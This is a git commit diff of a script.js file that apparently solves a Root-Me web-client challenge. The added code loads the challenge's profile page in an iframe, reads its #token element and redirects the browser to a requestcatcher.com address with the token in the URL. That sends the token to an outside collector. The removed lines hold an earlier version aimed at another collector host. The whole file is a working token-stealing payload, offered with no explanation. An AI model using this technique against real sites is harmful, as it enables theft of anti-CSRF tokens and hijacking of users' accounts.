66b311ba7c7266b51504b621405423e0f713c1bf
fullgitstack <mackormack0@gmail.com>
2025-10-09 17:57:26 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,8 @@
-  const token = ifr.contentWindow.document.querySelector("#token")
-  window.location.href = `https://yt54h.requestcatcher.com/${token}`
+const body1 = document.querySelector("body")
 
+const ifr = document.createElement("iframe")
+ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
+body1.appendChild(ifr)
+
+const token = ifr.contentWindow.document.querySelector("#token")
+window.location.href = `https://uj54uj.requestcatcher.com/${token}`
